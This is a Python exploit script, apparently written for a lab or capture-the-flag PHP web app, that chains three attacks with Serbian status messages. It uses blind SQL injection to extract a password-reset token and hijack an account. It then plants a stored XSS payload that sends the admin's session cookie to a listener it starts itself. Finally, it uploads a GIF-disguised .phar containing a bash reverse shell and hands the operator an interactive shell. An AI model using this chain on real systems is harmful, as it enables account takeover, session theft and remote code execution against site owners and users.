import requests, random, string, socket, sys, threading, time, re
from http.server import BaseHTTPRequestHandler, HTTPServer

BASE_URL     = "http://localhost:8000"
TARGET_USER  = "user1"
NEW_PASSWORD = "StudentiPobedjuju123!"
COOKIE_PORT  = 8001
COOKIE_FILE  = "admin_cookie.txt"
LHOST        = "10.248.9.109"
RCE_PORT     = 9999

session = requests.Session()

def stage_1_auth_bypass():
    print(f"\n--- STAGE 1: Authentication Bypass ({TARGET_USER}) ---")
    session.post(f"{BASE_URL}/forgotpassword.php", data={"username": TARGET_USER})

    alphabet = string.digits + string.ascii_letters
    token = ""
    print("[*] Izvlacenje reset tokena: ", end="", flush=True)

    for i in range(1, 33):
        for char in alphabet:
            payload = f"{TARGET_USER}' AND (SELECT SUBSTR(token,{i},1) FROM tokens WHERE uid=(SELECT uid FROM users WHERE username='{TARGET_USER}') ORDER BY tid LIMIT 1)='{char}';--"
            r = session.post(f"{BASE_URL}/forgotusername.php", data={"username": payload})
            if "User exists!" in r.text:
                token += char
                print(char, end="", flush=True)
                break

    res = session.post(f"{BASE_URL}/resetpassword.php", data={
        "token": token, "password1": NEW_PASSWORD, "password2": NEW_PASSWORD
    })

    if "Password changed!" in res.text:
        print(f"\n[+] Lozinka za {TARGET_USER} promenjena.")
        return True
    print("\n[-] Neuspešno.")
    return False

def stage_2_privilege_escalation():
    print(f"\n--- STAGE 2: Privilege Escalation (XSS) ---")

    session.post(f"{BASE_URL}/login.php", data={"username": TARGET_USER, "password": NEW_PASSWORD})

    xss_payload = f"<script>fetch('http://host.docker.internal:{COOKIE_PORT}/?cookie=' + document.cookie).catch(e => {{fetch('http://localhost:{COOKIE_PORT}/?cookie=' + document.cookie);}});</script>"
    session.post(f"{BASE_URL}/profile.php", data={"description": xss_payload, "update": "1"})
    print("[+] XSS payload ubačen u profil.")

    class CookieGrabber(BaseHTTPRequestHandler):
        def do_GET(self):
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b"OK")
            match = re.search(r'PHPSESSID=([a-zA-Z0-9]+)', self.path)
            if match:
                captured_id = match.group(1)
                print(f"\n[+] Admin cookie uhvaćen: {captured_id}")
                with open(COOKIE_FILE, "w") as f:
                    f.write(captured_id)
                raise KeyboardInterrupt  # gasi server

        def log_message(self, *args):
            return

    print(f"[*] Čekam admin cookie na portu {COOKIE_PORT}...")
    server = HTTPServer(("0.0.0.0", COOKIE_PORT), CookieGrabber)
    try:
        server.serve_forever()
    except KeyboardInterrupt:
        server.server_close()

def stage_3_rce(cookie):
    print(f"\n--- STAGE 3: Remote Code Execution ---")

    filename = "".join(random.choices(string.ascii_letters, k=8)) + ".phar"
    payload  = f"GIF87a<?php exec(\"/bin/bash -c 'bash -i >& /dev/tcp/{LHOST}/{RCE_PORT} 0>&1'\"); ?>"

    requests.post(
        f"{BASE_URL}/admin/upload_image.php",
        files={"title": (None, "POC"), "image": (filename, payload, "image/gif")},
        headers={"cookie": f"PHPSESSID={cookie}"}
    )
    print(f"[*] Payload uploadovan: {filename}")

    server = socket.socket()
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(("0.0.0.0", RCE_PORT))
    server.listen(1)
    server.settimeout(15)
    print(f"[*] Čekam shell na portu {RCE_PORT}...")

    def trigger():
        time.sleep(0.5)
        try:
            requests.get(f"{BASE_URL}/images/{filename}", timeout=3)
        except:
            pass

    threading.Thread(target=trigger, daemon=True).start()

    try:
        conn, addr = server.accept()
        print(f"[+] Shell dobijen! {addr[0]}\n")
    except socket.timeout:
        print("[-] Nema konekcije - proveri LHOST")
        sys.exit(1)

    def primaj():
        while True:
            try:
                data = conn.recv(4096)
                if not data: break
                sys.stdout.write(data.decode(errors="replace"))
                sys.stdout.flush()
            except:
                break

    threading.Thread(target=primaj, daemon=True).start()

    try:
        while True:
            conn.send((input() + "\n").encode())
    except KeyboardInterrupt:
        print("\n[*] Kraj.")
        conn.close()
        server.close()

if __name__ == "__main__":
    if not stage_1_auth_bypass():
        sys.exit(1)

    stage_2_privilege_escalation()

    try:
        with open(COOKIE_FILE, "r") as f:
            admin_cookie = f.read().strip()
        print(f"[*] Koristim cookie: {admin_cookie}")
    except FileNotFoundError:
        print("[-] Cookie fajl nije pronađen.")
        sys.exit(1)

    stage_3_rce(admin_cookie)